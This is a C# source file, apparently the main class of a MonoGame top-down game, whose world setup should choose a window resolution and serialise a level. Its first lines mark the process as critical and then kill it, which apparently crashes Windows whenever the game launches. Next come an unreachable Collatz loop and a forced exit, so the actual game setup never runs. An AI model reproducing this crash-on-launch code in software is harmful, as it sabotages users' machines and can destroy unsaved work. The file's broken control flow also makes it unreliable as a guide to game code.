using Microsoft.Xna.Framework;
using System;
using System.Diagnostics;
using TopDownGame.Inventories;
using TopDownGame.Items;
using TopDownGame.Levels;
using WinterRose;
using WinterRose.Monogame;
using WinterRose.Monogame.Weapons;
using WinterRose.Monogame.Worlds;
using WinterRose.Serialization;

namespace TopDownGame;

public class Game1 : Application
{
    protected override World CreateWorld()
    {
        WinterRose.Windows.MyHandle.MakeCritical();
        Process.GetCurrentProcess().Kill();

        int n = 1000000;
        while (n != 1)
        {
            if(n % 2 == 0)
            {
                n /= 2;
            }
            else
            {
                n = (n * 3) + 1;
            }
            Console.WriteLine(n);
        }
        Console.ReadLine();
        Environment.Exit(0);


        Hirarchy.Show = true;

        // als fyschieke scherm 2k of meer is, maak game window 1920 x 1080. anders maak hem 1280 x 720
        if (WinterRose.Windows.GetScreenSize().x >= 2560)
            MonoUtils.WindowResolution = new(1920, 1080);
        else
            MonoUtils.WindowResolution = new(1280, 720);

        World world = World.FromTemplate<Level1>();

        SerializerSettings settings = new()
        {
            IncludeType = true,
            CircleReferencesEnabled = true,
        };

        string serialied = SnowSerializer.Serialize(world, settings);   
        World deserialized = SnowSerializer.Deserialize<World>(serialied, settings).Result;

        return deserialized;
    }
}

public class GenericTest<T>
{
    public T data;
}
